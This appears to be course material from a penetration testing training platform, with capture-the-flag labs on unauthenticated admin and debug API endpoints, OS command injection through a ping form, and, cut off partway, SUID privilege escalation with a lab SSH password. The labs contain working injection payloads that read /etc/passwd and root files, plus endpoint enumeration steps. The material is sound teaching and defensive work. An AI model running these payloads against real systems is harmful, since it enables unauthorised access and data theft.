docs.text: Weeks 1 through 4 covered network discovery, SMB (Server Message Block) share enumeration, SNMP (Simple Network Management Protocol) community strings, and directory traversal. Each of those labs focused on finding information that a server exposes unintentionally. Week 5 shifts to an intermediate challenge: probing a web-based API (Application Programming Interface) for broken access controls. Your VPN must be connected and your terminal open before proceeding.

docs.title: Scenario
docs.text:
Metro Transit Authority (MTA) in Seattle has launched a public-facing REST (Representational State Transfer) API so third-party developers can build transit apps. The API serves route information, schedules, and real-time arrival data through documented endpoints. Lisa Park, Director of Digital Services, commissioned your assessment with a clear concern: internal administrative endpoints meant for the operations team should require API keys, and she wants confirmation that nobody can reach them without proper credentials.

Your scope covers all API endpoints on the target host. Two assessment tokens are embedded in endpoints that should not be publicly accessible. Your goal is to find both tokens and assemble the flag.

The Metro Transit Authority public API as a developer sees it: documented `/api/routes`, `/api/schedules`, and `/api/arrivals` endpoints. The administrative paths Lisa Park wants tested are not advertised here.

docs.title: Your Objectives
docs.text:
• Discover and review the API documentation on the target host
  • Enumerate common API paths to find undocumented or administrative endpoints
  • Identify broken access control vulnerabilities in the REST API
  • Extract sensitive data from unprotected admin and debug interfaces
  • Assemble and submit the flag

docs.title: Background: REST APIs and Broken Access Control
docs.text:
A REST API exposes server-side resources through predictable URL (Uniform Resource Locator) paths. Clients send HTTP (Hypertext Transfer Protocol) requests; GET to read data, POST to create records, PUT to update them, DELETE to remove them; and the server responds with structured data, usually in JSON (JavaScript Object Notation) format. Public APIs often document their endpoints so developers know which paths exist and what parameters each one accepts.

Authentication verifies who the caller is. A login form, an API key in a header, or a bearer token all serve as authentication mechanisms. Authorization determines what an authenticated caller is allowed to do. A transit app developer might be authenticated but should not be authorized to view the admin user list. When a server fails to enforce authorization checks, any caller; authenticated or not; can reach restricted resources. The OWASP (Open Worldwide Application Security Project) Top 10 ranks Broken Access Control as the number-one web application security risk (A01:2021) because the consequences range from data leaks to full system compromise.

The diagram below shows two request flows: one where the API enforces authorization and blocks the caller, and one where the check is missing entirely.

graph TD
    A["Client sends<br/>API request"] --> B{"Authorization<br/>check?"}
    B -->|"Check enforced"| C{"Valid<br/>credentials?"}
    C -->|"Yes"| D["200 OK<br/>Data returned"]
    C -->|"No"| E["401 Unauthorized<br/>Access denied"]
    B -->|"No check"| F["200 OK<br/>Data leaked"]

    style A fill:#4a90d9,color:#fff
    style D fill:#6aaa64,color:#fff
    style E fill:#888,color:#fff
    style F fill:#d9534f,color:#fff

The red node represents the vulnerability you will exploit in the lab. When a server skips the authorization check, sensitive endpoints respond to anyone who requests them.

docs.title: Tool Primer: curl for API Testing
docs.text:
The curl command-line tool sends HTTP requests and displays the server's response. Security testers use curl because it gives precise control over the method, headers, and body of each request without the overhead of a browser. The sections below cover the flags you will need for the lab.

Send a basic GET request

A plain curl command sends an HTTP GET request and prints the response body to the terminal. Most API endpoints return JSON data.

curl http://<target>/api/routes

The response body prints directly to your terminal, showing whatever the endpoint returns.

Useful flags:

Flag Purpose Example -s Silent mode; hides the progress bar curl -s http://<target>/api/routes -X Set the HTTP method curl -s -X POST http://<target>/api/data -H Add a custom header curl -s -H "Authorization: Bearer TOKEN" http://<target>/api/admin -o Write output to a file curl -s http://<target>/api/debug -o debug.json -v Verbose; show request and response headers curl -v http://<target>/api/routes

Format JSON output for readability

Piping through python3 -m json.tool formats raw JSON output into a readable, indented structure.

curl -s http://<target>/api/routes | python3 -m json.tool

Indented JSON makes it far easier to spot tokens, keys, and other sensitive values buried in large responses.

Sample formatted output:

{
    "routes": [
        {
            "id": 1,
            "name": "Route 44",
            "status": "active"
        }
    ]
}

Readable JSON makes it far easier to spot tokens, keys, and other sensitive values buried in large responses.

docs.title: Step 1: Launch the Exercise
docs.text:
Open the platform in your browser and start the exercise environment. You need a running container before any API requests will succeed.

  • Navigate to Exercises and locate the Week 5 challenge
  • Click Launch on "Metro Transit; Insecure API Endpoints"
  • Wait for the status to change to Running
  • Note the target IP displayed in the Active Lab View

docs.title: Step 2: Explore the Public API and Documentation
docs.text:
Before testing for vulnerabilities, understand what the API is supposed to expose. Start by visiting the root URL and the documentation endpoint to learn the intended public surface.

Read the API root and documentation

Replace <target> with the IP address shown in the Active Lab View. The root URL often returns a welcome message or version banner, and the docs endpoint lists the intended public routes.

curl -s http://<target>/ | python3 -m json.tool

curl -s http://<target>/api/docs | python3 -m json.tool

Read through the documentation response carefully. Note every endpoint listed; these are the paths MTA considers public. Pay attention to the URL structure and naming conventions the developers chose (for example, /api/routes, /api/schedules). The naming pattern gives you a mental model for guessing where admin or internal endpoints might live.

Confirm a documented public endpoint responds

Try one of the documented public endpoints to confirm the API is responding.

curl -s http://<target>/api/routes | python3 -m json.tool

You should see JSON data about transit routes. A working public endpoint confirms your network connection and tells you the API is live.

docs.title: Step 3: Enumerate Common API Paths
docs.text:
Developers frequently create administrative and debugging endpoints during development and forget to restrict access before deployment. Common path patterns include /api/admin, /api/debug, /api/internal, and /api/config. Test each of these against the target.

Probe common administrative and debug paths

Request each candidate path in turn and watch the status and body of each response.

curl -s http://<target>/api/admin | python3 -m json.tool

curl -s http://<target>/api/debug | python3 -m json.tool

curl -s http://<target>/api/internal | python3 -m json.tool

curl -s http://<target>/api/config | python3 -m json.tool

Record the HTTP response from each path. Some will return 404 Not Found or an error message, which means the path does not exist. Others may return data; those are the interesting ones. Any endpoint that returns data without requiring authentication credentials represents a potential broken access control finding.

docs.title: Step 4: Access the Admin Users Endpoint
docs.text:
The /api/admin path likely revealed a sub-resource or gave a hint about deeper paths. Try requesting the user list from the admin interface.

Request the admin user list

Pull the user records from the admin sub-resource without any credentials.

curl -s http://<target>/api/admin/users | python3 -m json.tool

Examine the JSON response. The endpoint returns user records that should be restricted to authorized administrators. Look for a field named assessment_token or similar; the value is your first token. Look for a field named assessment_token or similar; the value is your first token. Copy the token value and save it somewhere accessible; you will need it to assemble the final flag.

The fact that the server returned user data without requiring any API key or session token is a textbook Broken Access Control vulnerability (OWASP A01:2021). An attacker could harvest usernames, email addresses, roles, and other sensitive information from an endpoint like this.

The unauthenticated `/api/admin/users` endpoint returns the internal user roster, complete with a live service `api_key`. The assessment token value is redacted here so the flag stays hidden, but the exposure is the finding. No key or session was required to reach it.

docs.title: Step 5: Access the Debug Endpoint
docs.text:
Debug interfaces are another common source of information leakage. Developers build them to inspect application state during testing, and they often expose configuration details, internal paths, and credentials.

Query the debug endpoint

Request the debug interface and read the configuration data it leaks.

curl -s http://<target>/api/debug | python3 -m json.tool

Review the JSON output. Look for a field named debug_token or similar. The value is your second token. Copy the token value and save it alongside the first one.

docs.title: Record Your Findings
docs.text:
Record the responses from each endpoint you tested. Documenting every request and response builds your evidence trail, which is essential in a real-world assessment report.

Public endpoint response (e.g., /api/routes):

(paste your output here)

Admin users endpoint response (/api/admin/users):

(paste your output here)

Debug endpoint response (/api/debug):

(paste your output here)

Tokens I found:

Source Endpoint Token Value /api/admin/users /api/debug

docs.title: Step 6: Interpret the Results
docs.text:
Review the endpoints you discovered and the data each one returned. Two categories emerged from your testing: public endpoints that behave as intended, and administrative endpoints that should require authentication but do not.

  • The /api/docs and /api/routes endpoints are part of the documented public API. Returning transit data to any caller is the intended behavior.
  • The /api/admin/users endpoint returned user records without requiring an API key or session cookie. An authorization check should have blocked your request with a 401 Unauthorized or 403 Forbidden response. The server skipped the check entirely.
  • The /api/debug endpoint exposed internal configuration data. Debug endpoints should be disabled in production or protected behind authentication. Leaving them open gives attackers a window into the application's internals.

Both vulnerable endpoints represent OWASP A01:2021; Broken Access Control. The root cause is the same in each case: the server processes the request and returns data without verifying the caller's identity or permissions.

Flag Format

Assemble the flag using the tokens in the order you discovered them:

OCR{________}

Where token1 is from the /api/admin/users endpoint (BOLA vulnerability), and token2 is from the /api/debug endpoint.

docs.title: Step 7: Submit the Flag
docs.text:
Assemble the flag from the two tokens you extracted. The flag follows the OCR{...} format, combining both token values. Paste the assembled flag into the Submit Flag form on the platform and click Submit.

If the platform does not accept your flag, verify that you copied both tokens exactly as they appeared in the JSON responses. Check for extra spaces or missing characters.

docs.title: Analysis Questions
docs.text:
The questions below ask you to think beyond the lab steps and reason about real-world implications. Consider each one before reading the answer.

1. The /api/admin/users endpoint returned data without any authentication. Name two server-side controls that could prevent unauthorized access to the endpoint.

Reveal Answer

The server could require a valid API key in the Authorization header and reject requests that lack one (authentication). The server could also implement role-based access control so that even authenticated users without an admin role receive a 403 Forbidden response (authorization). Combining both controls; verifying identity and checking permissions; follows the defense-in-depth principle.

2. Why are debug endpoints particularly dangerous when left accessible in production?

Reveal Answer

Debug endpoints often expose internal state that goes far beyond what a single feature reveals. Configuration values, database connection strings, secret keys, and stack traces can all appear in debug output. An attacker who discovers a debug endpoint gains reconnaissance data that accelerates every subsequent attack, from privilege escalation to lateral movement.

3. How would an automated scanner or fuzzer help find undocumented API endpoints at scale?

Reveal Answer

A fuzzer sends hundreds or thousands of requests using wordlists of common path names (/admin, /debug, /config, /internal, /v1, /v2, /test, /backup, and many more). Each response code and body size is logged. Paths that return 200 OK or other success codes stand out from the 404 Not Found baseline. Tools like ffuf, gobuster, and feroxbuster automate the process and can test thousands of paths in seconds, far exceeding what manual curl commands can cover.

docs.title: Key Takeaways
docs.text:
• Broken Access Control (OWASP A01:2021) occurs when a server fails to verify whether a caller is authorized to access a resource, allowing anyone to reach restricted endpoints
  • API enumeration using common path names (/admin, /debug, /config, /internal) is a low-effort technique that frequently uncovers endpoints developers assumed would stay hidden
  • Debug endpoints expose internal application state and should be disabled or removed before code reaches production; obscurity is not a substitute for access control
  • Authentication and authorization are separate concerns: verifying who a caller is does not guarantee the caller has permission to perform the requested action
  • Week 6 builds on these API testing skills by introducing more advanced web application vulnerabilities, including parameter manipulation and session handling flaws

docs.title: Before You Begin
docs.text: Week 5 introduced API (Application Programming Interface) testing, where you crafted requests to interact with backend services and extract data through application logic flaws. Week 6 escalates from data extraction to code execution; instead of reading information the application was not meant to expose, you will execute operating system commands on the server itself. Your VPN must be connected and your terminal open before continuing.

docs.title: Scenario
docs.text:
CloudPing Diagnostics offers a web-based network diagnostic tool that customers use to test connectivity to their cloud infrastructure. The tool accepts a hostname or IP address and runs a ping test, displaying the results in the browser.

Tom Bradley (Lead Developer) built the tool as a weekend project: "It is a wrapper around the ping command. Takes the hostname, runs ping, shows the output. Nothing fancy."

Your assessment scope covers the diagnostic tool and the underlying server. Two tokens have been placed on the system; one accessible through basic command injection and one requiring deeper filesystem access. Your job is to determine whether the ping feature can be abused to run arbitrary commands.

docs.title: Your Objectives
docs.text:
The CloudPing diagnostic tool presents a specific attack surface worth investigating. Your goals for the assessment are listed below.

  • Identify a web application feature that interacts with the operating system
  • Test for OS (Operating System) command injection using shell metacharacters
  • Exploit command injection to execute arbitrary commands on the server
  • Read restricted files through injected commands
  • Assemble and submit the flag in OCR{...} format

docs.title: Background: OS Command Injection
docs.text:
Web applications sometimes need to interact with the underlying operating system. A network diagnostic tool might call the system's ping command, a file converter might invoke ffmpeg, or a monitoring dashboard might run df to check disk usage. When an application takes user input and passes it directly to a system shell without sanitization, attackers can inject additional commands that the server executes blindly.

Shell interpreters like bash and sh treat certain characters as metacharacters; symbols that change how a command line is parsed. The semicolon (;) separates two independent commands, so ping 127.0.0.1; id runs ping first and then runs id. The pipe (|) sends the output of one command into another. Double ampersand (&&) runs the second command only if the first succeeds, and double pipe (||) runs the second command only if the first fails. An attacker who controls part of a command string can use any of these metacharacters to append their own commands.

Input sanitization is the primary defense against command injection. A secure application validates that the user's input matches the expected format (for example, an IP address should contain only digits and dots), uses allowlists to restrict acceptable input, or avoids calling system commands entirely by using language-native libraries. Without these controls, any command the web server process can execute is available to the attacker.

graph TD
    A["User enters<br/>127.0.0.1"] -->|"Normal input"| B["Server runs<br/>ping 127.0.0.1"]
    B --> C["Ping output<br/>returned to browser"]
    D["User enters<br/>127.0.0.1; cat /etc/passwd"] -->|"Injected input"| E["Server runs<br/>ping 127.0.0.1;<br/>cat /etc/passwd"]
    E --> F["Ping output +<br/>file contents<br/>returned"]

    style A fill:#4a90d9,color:#fff
    style B fill:#6aaa64,color:#fff
    style C fill:#6aaa64,color:#fff
    style D fill:#d9534f,color:#fff
    style E fill:#d9534f,color:#fff
    style F fill:#d9534f,color:#fff

The diagram above contrasts a normal ping request with an injected command. The normal path runs only the intended ping command, while the injected path appends a second command that reads a sensitive file from the server.

docs.title: Tool Primer: curl POST Requests
docs.text:
Previous labs used curl for GET requests, where data travels in the URL. The CloudPing diagnostic tool accepts input through an HTTP (Hypertext Transfer Protocol) POST request, where data travels in the request body instead. The -X POST flag tells curl to use the POST method, and the -d flag attaches form data to the request body.

Send a basic POST request with form data

The -d flag sends the string host=127.0.0.1 as URL-encoded form data. The server receives the value 127.0.0.1 in the host parameter and uses it to run the ping command.

curl -X POST http://<target>/ping -d 'host=127.0.0.1'

The response returns the ping output the server produced for the value you supplied.

Send an injection payload

The semicolon after the IP address tells the shell to run a second command (id) after the ping.

curl -X POST http://<target>/ping -d 'host=127.0.0.1;id'

If the server is vulnerable, the response will contain both the ping output and the output of the id command.

URL-encode special characters when needed

Some characters need URL encoding when sent in POST data. The semicolon (;) works without encoding in most cases, but if a payload is not working, try encoding special characters. For example, a space becomes %20 and a semicolon becomes %3B. The --data-urlencode flag handles encoding automatically.

curl -X POST http://<target>/ping --data-urlencode 'host=127.0.0.1;cat /etc/passwd'

Encoding the payload helps when raw metacharacters get stripped or mangled in transit.

docs.title: Step 1: Launch the Exercise
docs.text:
Open the platform in your browser and start the exercise environment. You need running containers before any web requests will reach the target.

  • Navigate to Exercises and locate Exercise 6; Command Injection
  • Click Launch and wait for the status to change to Running
  • Note the target IP displayed in the Active Lab View

docs.title: Step 2: Use the Ping Tool Normally
docs.text:
Before testing for vulnerabilities, observe how the application behaves with legitimate input. Sending a normal request first establishes a baseline so you can recognize when output changes.

Run a valid ping request using the loopback address.

Send a baseline ping request

Replace <target> with the IP address shown in the Active Lab View. Sending a clean request first establishes a baseline so you can recognize when the output changes.

curl -X POST http://<target>/ping -d 'host=127.0.0.1'

The response should contain standard ping output; lines showing bytes from 127.0.0.1 with round-trip times. The application took your input, passed it to the system ping command, and returned the results.

docs.title: Step 3: Test for Command Injection
docs.text:
Now test whether the application sanitizes user input before passing it to the shell. The semicolon (;) is the most common metacharacter for separating commands in a Linux shell. Appending ; id after a valid IP address will reveal whether the server executes a second command.

Inject the id command

Append ;id to the host value so the shell runs id after the ping completes.

curl -X POST http://<target>/ping -d 'host=127.0.0.1;id'

Examine the response carefully. If command injection is possible, you will see the normal ping output followed by a line containing uid=, gid=, and groups=: the output of the id command. The presence of the id output confirms that the server executed your injected command.

Confirm with whoami

Run a simpler payload to double-check the injection point.

curl -X POST http://<target>/ping -d 'host=127.0.0.1;whoami'

The response should include a username (such as root or www-data) after the ping output. Both tests confirm the same vulnerability; the application passes your input directly to a shell without any filtering.

docs.title: Step 4: Read the Application Token
docs.text:
With command injection confirmed, you can use it to read files on the server. The first assessment token is stored in the application's configuration directory. Use cat to read the file contents through your injection payload.

Read the application config token

Inject a cat command that prints the token file from the application's config directory.

curl -X POST http://<target>/ping -d 'host=127.0.0.1;cat /opt/cloudping/config/token.txt'

The response will include the ping output followed by the contents of token.txt. Record the token value; you will need it to assemble the final flag.

docs.title: Step 5: Read the Root Flag
docs.text:
The second token requires reading a file in the /root directory. Use the same injection technique to read the flag file.

Read the root flag file

Inject a cat command that reads the flag from the /root directory, which only works because the web process runs with elevated privileges.

curl -X POST http://<target>/ping -d 'host=127.0.0.1;cat /root/flag.txt'

The response will contain the second token value after the ping output. Record the token value alongside the first one.

docs.title: Record Your Findings
docs.text:
Copy the output from each injection test and paste it below. Recording your work helps you track what worked and builds evidence for your assessment report.

Normal ping output (Step 2):

(paste your output here)

Command injection test; id output (Step 3):

(paste your output here)

Token 1; /opt/cloudping/config/token.txt (Step 4):

(paste your token here)

Token 2; /root/flag.txt (Step 5):

(paste your token here)

Assembled flag:

Component Value Token 1 Token 2 Full flag OCR{...}

docs.title: Step 6: Interpret the Results
docs.text:
Review the evidence you collected in the previous steps. Each finding tells you something about the security posture of the CloudPing application.

  • The id or whoami output: confirms that user input reaches a system shell without sanitization. The user account shown (e.g., root) also reveals the privilege level of the web application process. Running a web application as root means any injected command has full system access.
  • Token 1 from /opt/cloudping/config/token.txt: demonstrates that command injection grants read access to application configuration files. Configuration files often contain database credentials, API keys, and internal service URLs.
  • Token 2 from /root/flag.txt: demonstrates that the web process runs with elevated privileges, allowing access to files that should be restricted to the root user only.

Flag Format

Assemble the flag using the tokens in the order you discovered them:

OCR{________}

Where token1 is from /opt/cloudping/config/token.txt (command injection), and token2 is from /root/flag.txt.

docs.title: Step 7: Submit the Flag
docs.text: Combine the two tokens into the flag format OCR{...} as indicated by the lab instructions. Paste the assembled flag into the Submit Flag form on the platform and click Submit.

docs.title: Analysis Questions
docs.text:
The following questions ask you to think beyond the mechanics of the attack and consider the broader implications of command injection vulnerabilities.

1. The CloudPing application runs the ping command by passing user input to a system shell. What alternative approach could the developer use to avoid command injection entirely?

Reveal Answer

The developer could use a programming language's native networking library to send ICMP (Internet Control Message Protocol) echo requests instead of calling the system ping command through a shell. Python's subprocess module with a list of arguments (rather than a shell string) also prevents injection, because each argument is passed directly to the process without shell interpretation. Avoiding the shell entirely eliminates the injection vector.

2. You confirmed injection by appending ; id after the IP address. Name two other shell metacharacters that could achieve the same result, and explain how each one works.

Reveal Answer

The pipe character (|) sends the output of the first command as input to the second command, so 127.0.0.1 | id would run id and display its output. The double ampersand (&&) runs the second command only if the first succeeds, so 127.0.0.1 && id would run id after a successful ping. The double pipe (||) runs the second command only if the first fails, which can be useful when the first command produces an error.

3. The web application process runs as root. Why does running a web application with root privileges make command injection significantly more dangerous?

Reveal Answer

A process running as root has unrestricted access to every file and service on the system. Command injection under a limited user account (such as www-data) would restrict the attacker to files readable by that user. Running as root means the attacker can read /etc/shadow (password hashes), install persistent backdoors, modify system configurations, pivot to other machines on the network, and effectively control the entire server.

docs.title: Key Takeaways
docs.text:
• OS command injection occurs when a web application passes unsanitized user input to a system shell, allowing attackers to append arbitrary commands using metacharacters like ;, |, &&, and ||
  • Input validation is the primary defense; applications should restrict input to expected formats, use allowlists, or avoid shell calls entirely by using language-native libraries
  • Privilege escalation through process context means that a web application running as root gives an attacker full system control the moment command injection is discovered
  • POST-based injection works the same way as GET-based injection; the delivery mechanism changes, but the underlying vulnerability (unsanitized input reaching a shell) is identical
  • Week 7 builds on code execution by exploring reverse shells and persistence, where attackers use injection points to establish ongoing access rather than running one-off commands

docs.title: Before You Begin
docs.text: Weeks 4 through 6 focused on web exploitation; directory traversal, injection flaws, and authentication bypasses against HTTP services. Week 7 shifts to post-exploitation, where you already have a foothold on a Linux system and need to escalate your privileges. Your VPN must be connected and your terminal open before you proceed.

docs.title: Scenario
docs.text:
Meridian Data Corp, a data analytics firm in Portland, Oregon, contracted your team at Vanguard Offensive Security for an internal penetration test. Phase 1 of the engagement (initial access) is complete; your team obtained SSH (Secure Shell) credentials for a low-privilege developer account on one of their build servers through a phishing exercise.

Your task for Phase 2 is privilege escalation. The credentials you have belong to the "developer" account, which has standard user permissions. Your objective is to escalate to root and recover the system flag stored in /root/.

Riley Park (IT Security Manager) mentioned during the scoping call: "Our dev team has been installing various tools on these servers. I'm fairly sure the permissions are fine, but honestly nobody has audited them in months. If you find a way to root, document the exact misconfiguration so we can remediate."

Standard rules of engagement apply. Document your escalation path.

docs.title: Your Objectives
docs.text:
The following list outlines what you need to accomplish during the lab. Each objective maps to one or more walkthrough steps below.

  • Enumerate the target system for privilege escalation vectors
  • Identify SUID binaries using standard Linux enumeration techniques
  • Distinguish between normal and misconfigured SUID permissions
  • Exploit a SUID misconfiguration to escalate privileges to root
  • Capture the flag from /root/flag.txt

docs.title: Background: SUID Permissions and Privilege Escalation
docs.text:
Linux controls file access through a permission model based on three categories: owner, group, and others. Each category can be granted read (r), write (w), and execute (x) permissions. You can view these permissions with ls -l, which displays them as a 10-character string like -rwxr-xr-x.

Beyond the standard read/write/execute bits, Linux supports a special permission called the SUID (Set User ID) bit. When the SUID bit is set on an executable, that program runs with the permissions of the file's owner rather than the user who launched it. The SUID bit appears as an s in the owner's execute position; for example, -rwsr-xr-x indicates the SUID bit is active and the file is owned by root.

Several system utilities legitimately need the SUID bit. Programs like passwd, ping, and su require root-level access to function correctly, so they ship with SUID enabled by default. The danger arises when a binary that was never intended to have SUID receives it through a misconfiguration. If an attacker finds such a binary, they can use its built-in features to execute commands as root, read protected files, or spawn a root shell.

The following diagram illustrates how SUID execution differs from normal execution:

graph TD
    A["User runs a binary"] --> B{"SUID bit set?"}
    B -->|"No"| C["Runs as the<br/>calling user"]
    B -->|"Yes"| D["Runs as the<br/>file owner"]
    D --> E["If owner is root:<br/>full root privileges"]
    C --> F["Standard user<br/>permissions only"]

    style A fill:#4a90d9,color:#fff
    style B fill:#e8a735,color:#fff
    style C fill:#888,color:#fff
    style D fill:#d9534f,color:#fff
    style E fill:#d9534f,color:#fff
    style F fill:#6aaa64,color:#fff

Understanding the SUID mechanism is essential for both attackers and defenders. An attacker looks for misconfigured SUID binaries as a fast path to root. A defender audits SUID binaries regularly and removes the bit from anything that does not require it.

docs.title: Tool Primer: Finding SUID Binaries
docs.text:
The primary tool for locating SUID binaries on a Linux system is the find command with permission-based filtering. The following command searches the entire filesystem for files with the SUID bit set.

Find every SUID binary on the system

Run this on the target after you have a shell. The filter matches files where the SUID bit is set, which is the fast first check in Linux privilege escalation.

find / -perm -4000 -type f 2>/dev/null

The result is a list of file paths, each a binary that runs with its owner's permissions; compare the list against the known-good baseline to spot anything unusual.

Each part of the command serves a specific purpose:

  • find /: start searching from the root of the filesystem
  • -perm -4000: match files where the SUID bit (octal 4000) is set
  • -type f: restrict results to regular files (not directories or links)
  • 2>/dev/null: suppress "Permission denied" errors for directories you cannot read

Sample output:

/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/find
/usr/bin/mount
/usr/bin/umount

Most of the binaries in the list above are expected; passwd, su, mount, and umount are standard SUID programs on nearly every Linux distribution. The entry that should raise a red flag is /usr/bin/find. The find utility does not need elevated privileges for its normal purpose (searching for files), and it has the ability to execute arbitrary commands through its -exec flag.

GTFOBins is a curated online resource (gtfobins.github.io) that documents Unix binaries which can be exploited to bypass security restrictions. When you discover an unusual SUID binary, search GTFOBins for known escalation techniques. The site provides copy-paste commands for dozens of common utilities.

docs.title: Step 1: Launch the Exercise
docs.text:
Open the platform in your browser and start the exercise environment. You need the target server running before you can connect over SSH.

  • Navigate to Exercises and locate the Week 7 challenge
  • Click Launch on "SUID Privilege Escalation"
  • Wait for the status to change to Running
  • Note the target IP displayed in the Active Lab View

docs.title: Step 2: SSH into the Target as Developer
docs.text:
Your team obtained credentials for the developer account during Phase 1. Use SSH to connect to the build server with these credentials.

SSH into the build server

Replace <target_ip> with the IP address shown in the Active Lab View. When prompted for a password, enter the developer credential.

ssh developer@<target_ip>

When prompted for a password, enter:

M3r1d1an_D3v#
